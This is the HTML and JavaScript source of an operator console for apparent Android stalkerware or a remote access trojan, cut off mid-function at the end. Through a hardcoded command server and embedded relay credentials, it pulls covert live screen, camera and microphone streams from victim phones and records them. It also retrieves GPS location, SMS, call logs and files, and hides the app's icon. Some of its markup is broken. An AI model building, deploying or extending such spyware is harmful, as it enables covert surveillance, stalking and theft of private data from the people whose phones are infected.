<!DOCTYPE html>
<html>
<head>
    <title>SystemSync Console</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
    <style>
        /* ---------- CSS Variables for consistent theming ---------- */
        :root {
            --primary-color: #1976ff;
            --primary-dark: #0d5bca;
            --danger-color: #d32f2f;
            --danger-dark: #b71c1c;
            --text-primary: #1a2634;
            --text-secondary: #2c3e50;
            --text-muted: #7b8a9b;
            --bg-sidebar: #ffffff;
            --bg-main: #f5f7fa;
            --bg-panel: #ffffff;
            --border-color: #e0e4e8;
            --shadow-sm: 0 2px 8px rgba(0,0,0,0.05);
            --shadow-lg: 0 4px 20px rgba(0,0,0,0.1);
            
            --btn-height: 44px;
            --btn-padding: 12px;
            --btn-icon-size: 20px;
            --font-size-base: 14px;
            --font-size-small: 12px;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            margin: 0;
            background: var(--bg-main);
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            display: flex;
            height: 100vh;
            overflow: hidden;
            color: var(--text-primary);
        }

        #sidebar {
            width: 280px;
            background: var(--bg-sidebar);
            border-right: 1px solid var(--border-color);
            padding: 20px;
            overflow-y: auto;
            box-shadow: var(--shadow-sm);
            transition: transform 0.3s ease;
            z-index: 1000;
        }

        @media (max-width: 768px) {
            body {
                flex-direction: column;
            }
            
            #sidebar {
                position: fixed;
                top: 0;
                left: 0;
                bottom: 0;
                transform: translateX(-100%);
                z-index: 2000;
                width: 85%;
                max-width: 320px;
                box-shadow: var(--shadow-lg);
            }
            
            #sidebar.show {
                transform: translateX(0);
            }
            
            .sidebar-overlay {
                display: none;
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: rgba(0,0,0,0.5);
                z-index: 1500;
            }
            
            .sidebar-overlay.show {
                display: block;
            }
            
            #main {
                width: 100%;
                height: 100%;
            }
            
            #header {
                padding: 10px 15px !important;
            }
            
            .header-left {
                flex: 1;
            }
            
            .header-right {
                gap: 8px !important;
            }
            
            #deviceSelector {
                max-width: 150px;
                font-size: 13px;
            }
        }

        #header {
            height: 70px;
            background: var(--bg-panel);
            border-bottom: 1px solid var(--border-color);
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 25px;
            font-weight: 600;
            color: var(--text-primary);
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .menu-btn {
            display: none;
            background: transparent;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: var(--text-primary);
            padding: 8px;
            width: auto;
            margin: 0;
        }

        @media (max-width: 768px) {
            .menu-btn {
                display: block;
            }
        }

        .device-selector-container {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        #deviceSelector {
            padding: 8px 12px;
            height: var(--btn-height);
            border-radius: 20px;
            border: 1px solid var(--border-color);
            background: white;
            font-size: var(--font-size-base);
            min-width: 220px;
            cursor: pointer;
        }

        .device-count {
            background: var(--primary-color);
            color: white;
            padding: 2px 8px;
            border-radius: 12px;
            font-size: var(--font-size-small);
            font-weight: 600;
            white-space: nowrap;
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        #batteryInfo {
            display: none;
            align-items: center;
            gap: 8px;
            padding: 5px 12px;
            height: var(--btn-height);
            background: #f0f2f5;
            border-radius: 20px;
            font-size: var(--font-size-base);
        }

        .battery-icon {
            position: relative;
            width: 36px;
            height: 18px;
            border: 2px solid #555;
            border-radius: 4px;
            background: #fff;
        }

        .battery-level {
            position: absolute;
            top: 2px;
            left: 2px;
            height: 14px;
            background: #4caf50;
            border-radius: 2px;
        }

        .battery-icon.charging:after {
            content: "⚡";
            position: absolute;
            top: -12px;
            left: 10px;
            font-size: 18px;
        }

        .battery-percent {
            font-weight: 600;
            min-width: 45px;
        }

        #status {
            padding: 8px 16px;
            height: var(--btn-height);
            border-radius: 30px;
            background: #e8f0fe;
            color: var(--primary-color);
            font-weight: 500;
            cursor: pointer;
            display: flex;
            align-items: center;
            white-space: nowrap;
        }

        #status.offline {
            background: #ffebee;
            color: var(--danger-color);
        }

        .reconnect-btn {
            background: var(--primary-color);
            color: white;
            border: none;
            border-radius: 20px;
            padding: 0 15px;
            height: var(--btn-height);
            font-size: var(--font-size-base);
            cursor: pointer;
            white-space: nowrap;
        }

        #main {
            flex: 1;
            display: flex;
            flex-direction: column;
            min-width: 0;
            background: var(--bg-main);
        }

        #content {
            flex: 1;
            padding: 20px;
            overflow: auto;
        }

        #main-panel {
            background: var(--bg-panel);
            border-radius: 12px;
            box-shadow: var(--shadow-sm);
            padding: 20px;
            min-height: 100%;
            position: relative;
        }

        #welcomeMessage {
            text-align: center;
            padding: 40px 20px;
        }

        #welcomeMessage h2 {
            color: var(--text-primary);
            margin-bottom: 15px;
        }

        #welcomeMessage p {
            color: var(--text-muted);
            margin: 10px 0;
        }

        .logo {
            font-size: 20px;
            font-weight: 600;
            color: var(--primary-color);
            margin-bottom: 30px;
        }

        .section {
            margin-bottom: 25px;
        }

        .section-title {
            font-size: var(--font-size-small);
            font-weight: 600;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 12px;
        }

        button {
            width: 100%;
            height: var(--btn-height);
            padding: 0 var(--btn-padding);
            margin: 4px 0;
            background: white;
            color: var(--text-primary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            font-size: var(--font-size-base);
            text-align: left;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            gap: 8px;
            white-space: nowrap;
        }

        button:hover {
            background: var(--primary-color);
            color: white;
            border-color: var(--primary-color);
        }

        button span:first-child {
            font-size: var(--btn-icon-size);
            min-width: 24px;
            text-align: center;
        }

        .camera-panel {
            background: #f0f2f5;
            border-radius: 8px;
            padding: 12px;
            margin: 8px 0;
            display: none;
        }

        .camera-panel.show {
            display: block;
        }

        .camera-option {
            margin: 10px 0;
        }

        .camera-option label {
            margin-right: 20px;
            color: var(--text-primary);
            font-size: var(--font-size-base);
            cursor: pointer;
        }

        .camera-option input[type="radio"],
        .camera-option input[type="checkbox"] {
            margin-right: 5px;
            width: 16px;
            height: 16px;
            cursor: pointer;
        }

        .capture-btn, .live-btn {
            background: var(--primary-color);
            color: white;
            border: none;
            height: var(--btn-height);
            padding: 0 var(--btn-padding);
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
            font-weight: 600;
            justify-content: center;
        }

        .capture-btn:hover, .live-btn:hover {
            background: var(--primary-dark);
        }

        .live-controls {
            display: flex;
            gap: 8px;
            margin-top: 15px;
            flex-wrap: wrap;
        }

        .live-controls button {
            flex: 1;
            min-width: 100px;
            background: var(--primary-color);
            color: white;
            border: none;
            height: var(--btn-height);
            padding: 0 8px;
            border-radius: 6px;
            cursor: pointer;
            justify-content: center;
        }

        .live-controls button.stop {
            background: var(--danger-color);
        }

        .live-controls button.stop:hover {
            background: var(--danger-dark);
        }

        .file-manager {
            display: flex;
            flex-direction: column;
            height: 100%;
        }

        .file-toolbar-sticky {
            position: sticky;
            top: 0;
            background: var(--bg-panel);
            z-index: 10;
            padding-bottom: 15px;
            margin-bottom: 15px;
            border-bottom: 1px solid var(--border-color);
        }

        .file-toolbar {
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }

        .file-toolbar button {
            width: auto;
            min-width: 80px;
            height: var(--btn-height);
            padding: 0 12px;
            background: white;
            border: 1px solid var(--border-color);
            border-radius: 6px;
            cursor: pointer;
            font-size: var(--font-size-base);
            margin: 0;
        }

        .file-path {
            background: #f0f2f5;
            padding: 0 15px;
            height: var(--btn-height);
            border-radius: 20px;
            font-size: var(--font-size-base);
            color: var(--text-secondary);
            flex: 1;
            display: flex;
            align-items: center;
            overflow-x: auto;
            white-space: nowrap;
        }

        .file-panes {
            display: flex;
            gap: 20px;
            flex: 1;
            overflow: hidden;
            min-height: 400px;
        }

        @media (max-width: 768px) {
            .file-panes {
                flex-direction: column;
                gap: 10px;
            }
            
            .folder-pane, .file-pane {
                max-height: 300px;
            }
        }

        .folder-pane, .file-pane {
            flex: 1;
            background: #fafbfc;
            border-radius: 8px;
            padding: 15px;
            overflow-y: auto;
            border: 1px solid var(--border-color);
        }

        .pane-title {
            font-size: var(--font-size-small);
            font-weight: 600;
            color: var(--text-muted);
            margin-bottom: 15px;
            text-transform: uppercase;
        }

        .folder-item, .file-item {
            display: flex;
            align-items: center;
            padding: 8px 10px;
            border-radius: 6px;
            cursor: pointer;
            gap: 10px;
            margin-bottom: 2px;
            min-height: 40px;
        }

        .folder-item:hover {
            background: #e3f2fd;
        }

        .file-item {
            cursor: default;
        }

        .file-item:hover {
            background: #f5f5f5;
        }

        .folder-icon, .file-icon {
            font-size: 18px;
            min-width: 24px;
            text-align: center;
        }

        .folder-name, .file-name {
            flex: 1;
            font-size: var(--font-size-base);
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .folder-name {
            color: var(--primary-color);
        }

        .file-checkbox {
            width: 18px;
            height: 18px;
            cursor: pointer;
            margin-right: 5px;
        }

        .file-size {
            color: var(--text-muted);
            font-size: var(--font-size-small);
            margin: 0 10px;
            white-space: nowrap;
        }

        .file-actions {
            display: flex;
            gap: 5px;
        }

        .file-actions button {
            width: 32px;
            height: 32px;
            padding: 0;
            min-width: unset;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
            margin: 0;
        }

        .file-actions button.delete {
            color: var(--danger-color);
            border-color: var(--danger-color);
        }

        .file-actions button.delete:hover {
            background: var(--danger-color);
            color: white;
        }

        .download-selected {
            margin-top: 15px;
            text-align: right;
        }

        .download-selected button {
            width: auto;
            min-width: 180px;
            height: var(--btn-height);
            padding: 0 20px;
            background: var(--primary-color);
            color: white;
            border: none;
            border-radius: 6px;
            font-weight: 500;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            font-size: var(--font-size-base);
        }

        th {
            background: #f8fafd;
            color: var(--text-primary);
            font-weight: 600;
            padding: 12px 10px;
            text-align: left;
            border-bottom: 2px solid var(--border-color);
        }

        td {
            padding: 10px;
            border-bottom: 1px solid #eef2f5;
            color: var(--text-secondary);
            word-break: break-word;
        }

        tr:hover {
            background: #f5f9ff;
        }

        @media (max-width: 768px) {
            table {
                font-size: 12px;
            }
            
            th, td {
                padding: 8px 5px;
            }
        }

        #map {
            height: 400px;
            border-radius: 10px;
        }

        .map-info {
            position: absolute;
            top: 20px;
            left: 20px;
            right: 20px;
            background: rgba(255,255,255,0.95);
            padding: 12px;
            border-radius: 8px;
            box-shadow: var(--shadow-sm);
            font-size: var(--font-size-base);
            color: var(--text-primary);
            z-index: 1000;
            border-left: 4px solid var(--primary-color);
            max-width: 300px;
        }

        @media (max-width: 768px) {
            .map-info {
                left: 10px;
                right: 10px;
                max-width: none;
                font-size: 12px;
            }
        }

        .app-item {
            display: flex;
            align-items: center;
            padding: 15px;
            border-bottom: 1px solid var(--border-color);
        }

        .app-icon {
            width: 48px;
            height: 48px;
            margin-right: 15px;
            background: #f0f2f5;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }

        .app-details {
            flex: 1;
            min-width: 0;
        }

        .app-name {
            font-weight: 600;
            color: var(--text-primary);
            margin-bottom: 4px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .app-package {
            font-size: 11px;
            color: var(--text-muted);
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .app-actions {
            display: flex;
            gap: 8px;
        }

        .app-actions button {
            width: auto;
            min-width: 70px;
            height: 36px;
            padding: 0 12px;
            font-size: 12px;
            margin: 0;
            justify-content: center;
        }

        .app-actions button.open {
            background: var(--primary-color);
            color: white;
            border: none;
        }

        .app-actions button.uninstall {
            background: var(--danger-color);
            color: white;
            border: none;
        }

        .modal-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.85);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            overflow-x: auto;
        }

        .modal-overlay.show {
            display: flex;
        }

        .mobile-popup {
            width: 360px;
            height: 640px;
            display: flex;
            flex-direction: column;
            background: #0f0f0f;
            border-radius: 26px;
            border: 4px solid #2e2e2e;
            box-shadow: var(--shadow-lg);
            overflow: hidden;
            flex-shrink: 0;
        }

        .phone-frame {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            background: black;
            overflow: hidden;
            width: 100%;
            height: calc(640px - 84px);
        }

        .phone-frame video {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .popup-controls {
            flex-shrink: 0;
            background: #111;
            padding: 12px;
            display: flex;
            gap: 8px;
            justify-content: center;
            align-items: center;
            border-top: 1px solid #333;
            height: 84px;
        }

        .popup-controls button {
            width: 60px;
            height: 60px;
            min-width: 60px;
            max-width: 60px;
            padding: 0;
            background: #1e1e1e;
            color: white;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            font-size: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
            margin: 0;
            flex: none;
        }

        .popup-controls button.close-btn {
            background: #c0392b;
            width: 70px;
            min-width: 70px;
        }

        .popup-controls button:hover {
            transform: scale(1.1);
            background: #3a3a3c;
        }

        .popup-controls button.close-btn:hover {
            background: #e74c3c;
        }

        .popup-controls button:active {
            transform: scale(0.95);
        }

        @media (max-width: 400px) {
            .modal-overlay {
                justify-content: flex-start;
                padding: 10px;
            }
        }

        body.modal-open #sidebar,
        body.modal-open #main {
            pointer-events: none;
            filter: blur(4px);
            transition: filter 0.3s;
        }

        img, video {
            max-width: 100%;
            max-height: 70vh;
            border-radius: 8px;
            display: block;
            margin: 0 auto;
        }

        audio {
            width: 100%;
            margin-top: 15px;
        }

        .pagination {
            margin-top: 20px;
            display: flex;
            gap: 8px;
            justify-content: center;
            flex-wrap: wrap;
        }

        .page-btn {
            width: 40px;
            height: 40px;
            padding: 0;
            border: 1px solid var(--border-color);
            background: white;
            border-radius: 6px;
            cursor: pointer;
            color: var(--text-primary);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .page-btn:hover {
            background: var(--primary-color);
            color: white;
            border-color: var(--primary-color);
        }
    </style>
</head>
<body>

<div id="sidebarOverlay" class="sidebar-overlay" onclick="toggleSidebar()"></div>

<div id="screenModalOverlay" class="modal-overlay">
    <div class="mobile-popup" id="mobilePopup">
        <div class="phone-frame">
            <div class="screen-container">
                <video id="modalScreenVideo" autoplay playsinline></video>
            </div>
        </div>
        <div class="popup-controls">
            <button id="modalSnapBtn" title="Snapshot">📸</button>
            <button id="modalRecordBtn" title="Record">🔴</button>
            <button id="modalFullscreenBtn" class="fullscreen-btn" title="Fullscreen">⛶</button>
            <button id="modalCloseBtn" class="close-btn" title="Close">✕</button>
        </div>
    </div>
</div>

<div id="sidebar">
    <div class="logo">SystemSync</div>

    <div class="section">
        <div class="section-title">Device</div>
        <button onclick="getInstalledApps()"><span>📱</span> <span>Installed Apps</span></button>
    </div>

    <div class="section">
        <div class="section-title">Surveillance</div>
        <button id="screenShareBtn"><span>🖥</span> <span id="screenBtn">Start Screen</span></button>

        <button onclick="toggleCameraPanel('click')"><span>📷</span> <span>Click Picture</span></button>
        <div id="clickCameraPanel" class="camera-panel">
            <div class="camera-option">
                <label><input type="radio" name="clickCameraSelect" value="front" checked> Front</label>
                <label><input type="radio" name="clickCameraSelect" value="back"> Rear</label>
            </div>
            <div class="camera-option" id="flashOption">
                <label><input type="checkbox" id="clickFlashCheckbox"> Use flash</label>
            </div>
            <button class="capture-btn" onclick="capturePicture()">TAKE A PICTURE</button>
        </div>

        <button onclick="toggleCameraPanel('live')"><span>📹</span> <span>See Live</span></button>
        <div id="liveCameraPanel" class="camera-panel">
            <div class="camera-option">
                <label><input type="radio" name="liveCameraSelect" value="front" checked> FrontCAM</label>
                <label><input type="radio" name="liveCameraSelect" value="back"> BackCAM</label>
            </div>
            <div class="camera-option">
                <label><input type="checkbox" id="liveMicCheckbox" checked> Use mic</label>
            </div>
            <button class="live-btn" onclick="startLiveStream()">See Live</button>
        </div>

        <button onclick="toggleLiveAudio()"><span>🎤</span> <span id="liveAudioBtn">Live Audio</span></button>
        <button onclick="stopLiveAudio()" style="display:none;" id="stopLiveAudioBtn"><span>⏹</span> <span>Stop Live Audio</span></button>

        <button onclick="sendCommand('GET_LOCATION')"><span>📍</span> <span>GPS Location</span></button>
    </div>

    <div class="section">
        <div class="section-title">Data</div>
        <button onclick="sendCommand('LIST_FILES', { path: 'root' })"><span>📂</span> <span>File Manager</span></button>
        <button onclick="sendCommand('GET_SMS', { box: 'inbox' })"><span>💬</span> <span>SMS Logs</span></button>
        <button onclick="sendCommand('GET_CALL_LOGS')"><span>📞</span> <span>Call Logs</span></button>
    </div>

    <div class="section">
        <div class="section-title">Control</div>
        <button onclick="toggleAppIcon()"><span>👻</span> <span id="iconBtn">Hide Icon</span></button>
        <button onclick="sendCommand('VIBRATE', { duration: 1000 })"><span>📳</span> <span>Vibrate (1s)</span></button>
    </div>
</div>

<div id="main">
    <div id="header">
        <div class="header-left">
            <button class="menu-btn" onclick="toggleSidebar()">☰</button>
            <span>SystemSync Console</span>
            <div class="device-selector-container">
                <select id="deviceSelector" onchange="switchDevice(this.value)">
                    <option value="">Select Device</option>
                </select>

                    <div class="battery-level" style="width: 0%"></div>
                </div>
                <span class="battery-percent">--%</span>

            <button class="reconnect-btn" onclick="connectWebSocket()">⟲</button>
        </div>
    </div>
    <div id="content">
        <div id="main-panel">
            <div id="welcomeMessage">
                <h2>👋 Welcome to SystemSync Console</h2>

                <p>When a device installs the app, it will appear in the dropdown menu above.</p>
            </div>

</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
    // ---------- GLOBALS ----------
    const WS_URL = "wss://mirror-view.onrender.com";
    let ws = null;

    let screenPC = null;
    let cameraPC = null;
    let audioPC = null;

    let mapInstance = null;
    let currentData = [];
    let currentPage = 0;
    let dataType = null;
    let currentPath = "root";
    let selectedFiles = [];
    let screenActive = false;
    let iconHidden = false;

    let mediaRecorder = null;
    let recordedChunks = [];

    let pendingCommand = null;

    let devices = new Map();
    let currentDeviceId = null;

    let currentBatteryLevel = 0;
    let currentBatteryStatus = 'unknown';

    // Audio recording variables
    let audioMediaRecorder = null;
    let audioRecordedChunks = [];

    const panel = document.getElementById('main-panel');
    const statusEl = document.getElementById('status');

    const modalOverlay = document.getElementById('screenModalOverlay');
    const modalVideo = document.getElementById('modalScreenVideo');
    const modalSnapBtn = document.getElementById('modalSnapBtn');
    const modalRecordBtn = document.getElementById('modalRecordBtn');
    const modalFullscreenBtn = document.getElementById('modalFullscreenBtn');
    const modalCloseBtn = document.getElementById('modalCloseBtn');

    function getFormattedDateTime() {
        const d = new Date();
        const pad = (n) => n.toString().padStart(2, '0');
        return `${pad(d.getDate())}-${pad(d.getMonth()+1)}-${d.getFullYear()}-${pad(d.getHours())}-${pad(d.getMinutes())}-${pad(d.getSeconds())}`;
    }

    const ICE_SERVERS = [
        { urls: "stun:stun.relay.metered.ca:80" },
        { urls: "turn:standard.relay.metered.ca:80", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
        { urls: "turn:standard.relay.metered.ca:80?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
        { urls: "turn:standard.relay.metered.ca:443", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
        { urls: "turns:standard.relay.metered.ca:443?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" }
    ];

    function sendSignalingMessage(msg) {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            console.error('WebSocket not open');
            return;
        }
        const payload = {
            type: 'SIGNALING',
            data: msg
        };
        ws.send(JSON.stringify(payload));
        console.log('📤 Signaling sent:', msg.type);
    }

    function createPeerConnection(streamType, onTrackCallback, useMic = false) {
        const pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });

        if (streamType === 'screen') {
            pc.addTransceiver('video', { direction: 'recvonly' });
        } else if (streamType === 'camera') {
            pc.addTransceiver('video', { direction: 'recvonly' });
            if (useMic) {
                pc.addTransceiver('audio', { direction: 'recvonly' });
            }
        } else if (streamType === 'audio') {
            pc.addTransceiver('audio', { direction: 'recvonly' });
        }

        pc.ontrack = onTrackCallback;
        pc.onicecandidate = (e) => {
            if (e.candidate) {
                sendSignalingMessage({
                    type: 'ICE_CANDIDATE',
                    candidate: e.candidate,
                    streamType: streamType
                });
            }
        };
        pc.oniceconnectionstatechange = () => {
            console.log(`${streamType} ICE state:`, pc.iceConnectionState);
            if (pc.iceConnectionState === 'disconnected' || pc.iceConnectionState === 'failed') {
                if (streamType === 'screen') {
                    screenActive = false;
                    document.getElementById('screenBtn').innerText = 'Start Screen';
                    closeScreenModal();
                } else if (streamType === 'audio') {
                    // Auto-stop audio if disconnected
                    stopLiveAudio();
                }
            }
        };
        return pc;
    }

    function getPCForType(type) {
        if (type === 'screen') return screenPC;
        if (type === 'camera') return cameraPC;
        if (type === 'audio') return audioPC;
        return null;
    }

    function handleSignalingMessage(msg) {
        console.log('Received signaling:', msg);
        if (msg.type === 'ANSWER') {
            const pc = getPCForType(msg.streamType);
            if (pc) {
                const answer = new RTCSessionDescription({ type: 'answer', sdp: msg.sdp });
                pc.setRemoteDescription(answer).catch(e => console.error('Error setting remote description:', e));
            }
        } else if (msg.type === 'ICE_CANDIDATE') {
            const pc = getPCForType(msg.streamType);
            if (pc && msg.candidate) {
                pc.addIceCandidate(new RTCIceCandidate(msg.candidate)).catch(e => console.error('Error adding ICE candidate:', e));
            }
        }
    }

    function openScreenModal() {
        modalOverlay.classList.add('show');
        document.body.classList.add('modal-open');
        modalRecordBtn.innerText = '🔴';
        if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
            screenMediaRecorder.stop();
        }
        screenMediaRecorder = null;
        screenRecordedChunks = [];
    }

    function closeScreenModal() {
        if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
            screenMediaRecorder.stop();
        }
        modalOverlay.classList.remove('show');
        document.body.classList.remove('modal-open');
        if (screenActive) {
            toggleScreen();
        }
        modalRecordBtn.innerText = '🔴';
    }

    async function toggleScreen() {
        if (!currentDeviceId) {
            alert('Please select a device first');
            return;
        }

        if (screenActive) {
            if (screenPC) {
                screenPC.close();
                screenPC = null;
            }
            document.getElementById('screenBtn').innerText = 'Start Screen';
            screenActive = false;
            closeScreenModal();
            sendSignalingMessage({ type: 'STOP_SCREEN' });
        } else {
            openScreenModal();
            modalVideo.srcObject = null;

            screenPC = createPeerConnection('screen', (e) => {
                modalVideo.srcObject = e.streams[0];
                console.log('ontrack for screen', e.streams);
            }, false);

            try {
                const offer = await screenPC.createOffer();
                await screenPC.setLocalDescription(offer);
                sendSignalingMessage({
                    type: 'OFFER',
                    sdp: offer.sdp,
                    streamType: 'screen'
                });
                document.getElementById('screenBtn').innerText = 'Stop Screen';
                screenActive = true;
                showNotification("Screen sharing started. A system notification will appear – this is normal.");
            } catch (e) {
                console.error('Screen share failed:', e);
                showNotification('Failed: ' + e.message);
                screenPC = null;
                closeScreenModal();
            }
        }
    }

    function snapScreenFromModal() {
        if (!modalVideo || !modalVideo.videoWidth) {
            alert('No active screen share or video not ready');
            return;
        }
        const canvas = document.createElement('canvas');
        canvas.width = modalVideo.videoWidth;
        canvas.height = modalVideo.videoHeight;
        canvas.getContext('2d').drawImage(modalVideo, 0, 0);
        canvas.toBlob(blob => {
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.download = `screenImage-${getFormattedDateTime()}.png`;
            a.href = url;
            a.click();
            URL.revokeObjectURL(url);
        }, 'image/png');
    }

    let screenMediaRecorder = null;
    let screenRecordedChunks = [];

    function toggleScreenRecording() {
        if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
            screenMediaRecorder.stop();
            modalRecordBtn.innerText = '🔴';
        } else {
            if (!modalVideo.srcObject) {
                alert('Phone Screen Off');
                return;
            }
            screenRecordedChunks = [];
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const stream = modalVideo.srcObject;

            if (modalVideo.videoWidth === 0) {
                modalVideo.onloadedmetadata = () => startScreenRecording(canvas, ctx, stream);
            } else {
                startScreenRecording(canvas, ctx, stream);
            }
        }
    }

    function startScreenRecording(canvas, ctx, originalStream) {
        canvas.width = modalVideo.videoWidth;
        canvas.height = modalVideo.videoHeight;

        function drawVideoFrame() {
            ctx.drawImage(modalVideo, 0, 0, canvas.width, canvas.height);
            requestAnimationFrame(drawVideoFrame);
        }
        drawVideoFrame();

        const canvasStream = canvas.captureStream(30);
        originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));

        screenMediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
        screenMediaRecorder.ondataavailable = (e) => screenRecordedChunks.push(e.data);
        screenMediaRecorder.onstop = () => {
            const blob = new Blob(screenRecordedChunks, { type: 'video/webm' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `screenVideo-${getFormattedDateTime()}.webm`;
            a.click();
            URL.revokeObjectURL(url);
            canvasStream.getTracks().forEach(track => track.stop());
        };
        screenMediaRecorder.start();
        modalRecordBtn.innerText = '🟢';
    }

    function toggleFullscreen() {
        if (!document.fullscreenElement) {
            modalVideo.requestFullscreen().catch(err => console.error('Fullscreen error:', err));
        } else {
            document.exitFullscreen();
        }
    }

    async function startLiveStream() {
        if (!currentDeviceId) {
            alert('Please select a device first');
            return;
        }

        const camera = document.querySelector('input[name="liveCameraSelect"]:checked').value;
        const useMic = document.getElementById('liveMicCheckbox').checked;

        panel.innerHTML = `
            <video id="liveCamVideo" autoplay playsinline style="transform: scaleX(-1);"></video>
            <div class="live-controls">
                <button onclick="takeSnapshot()" id="snapshotBtn">Take Snapshot</button>
                <button onclick="toggleRecording()" id="recordBtn">Record Video</button>
                <button class="stop" onclick="stopLiveStream()">Stop</button>
            </div>
        `;

        cameraPC = createPeerConnection('camera', (e) => {
            const video = document.getElementById('liveCamVideo');
            if (video) video.srcObject = e.streams[0];
        }, useMic);

        try {
            const offer = await cameraPC.createOffer();
            await cameraPC.setLocalDescription(offer);
            sendSignalingMessage({
                type: 'OFFER',
                sdp: offer.sdp,
                streamType: 'camera',
                camera: camera,
                mic: useMic
            });
        } catch (e) {
            console.error('Live camera start failed:', e);
            showNotification('Failed to start camera stream');
            cameraPC = null;
            panel.innerHTML = 'Ready.';
        }
    }

    function stopLiveStream() {
        if (cameraPC) {
            cameraPC.close();
            cameraPC = null;
        }
        sendSignalingMessage({ type: 'STOP_CAMERA' });
        panel.innerHTML = 'Ready.';
    }

    // Updated Live Audio with recording
    async function toggleLiveAudio() {
        if (!currentDeviceId) {
            alert('Please select a device first');
            return;
        }

        if (audioPC) {
            stopLiveAudio();
        } else {
            startLiveAudio();
        }
    }

    async function startLiveAudio() {
        panel.innerHTML = `
            <div style="text-align:center;">
                <p>Live audio streaming...</p>
                <audio id="liveAudio" autoplay controls style="width:100%; margin-top:10px;"></audio>
                <div class="live-controls" style="margin-top:15px;">
                    <button onclick="toggleAudioRecording()" id="audioRecordBtn">🔴 Record</button>
                    <button class="stop" onclick="stopLiveAudio()">Stop</button>
                </div>
            </div>
        `;

        audioPC = createPeerConnection('audio', (e) => {
            const audioEl = document.getElementById('liveAudio');
            if (audioEl) {
                audioEl.srcObject = e.streams[0];
                audioEl.play().catch(err => console.log('Autoplay prevented:', err));
            }
        }, true);

        try {
            const offer = await audioPC.createOffer();
            await audioPC.setLocalDescription(offer);
            sendSignalingMessage({
                type: 'OFFER',
                sdp: offer.sdp,
                streamType: 'audio',
                mic: true
            });
            document.getElementById('liveAudioBtn').parentElement.style.display = 'none';
            document.getElementById('stopLiveAudioBtn').style.display = 'block';
        } catch (e) {
            console.error('Live audio start failed:', e);
            showNotification('Failed to start audio stream');
            audioPC = null;
            panel.innerHTML = 'Ready.';
        }
    }

    function stopLiveAudio() {
        // Stop any ongoing audio recording
        if (audioMediaRecorder && audioMediaRecorder.state === 'recording') {
            stopAudioRecording();
        }

        if (audioPC) {
            audioPC.close();
            audioPC = null;
        }
        sendSignalingMessage({ type: 'STOP_AUDIO' });
        document.getElementById('liveAudioBtn').parentElement.style.display = 'block';
        document.getElementById('stopLiveAudioBtn').style.display = 'none';
        panel.innerHTML = 'Ready.';
    }

    // Audio recording functions
    function toggleAudioRecording() {
        const audioEl = document.getElementById('liveAudio');
        if (!audioEl || !audioEl.srcObject) {
            alert('No active audio stream');
            return;
        }

        if (audioMediaRecorder && audioMediaRecorder.state === 'recording') {
            stopAudioRecording();
            document.getElementById('audioRecordBtn').innerText = '🔴 Record';
        } else {
            startAudioRecording(audioEl.srcObject);
            document.getElementById('audioRecordBtn').innerText = '⏹ Stop Recording';
        }
    }

    function startAudioRecording(stream) {
        audioRecordedChunks = [];
        audioMediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
        audioMediaRecorder.ondataavailable = (e) => {
            if (e.data.size > 0) audioRecordedChunks.push(e.data);
        };
        audioMediaRecorder.onstop = () => {
            const blob = new Blob(audioRecordedChunks, { type: 'audio/webm' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `audio-recording-${getFormattedDateTime()}.webm`;
            a.click();
            URL.revokeObjectURL(url);
            audioRecordedChunks = [];
        };
        audioMediaRecorder.start();
        showNotification('Recording started');
    }

    function stopAudioRecording() {
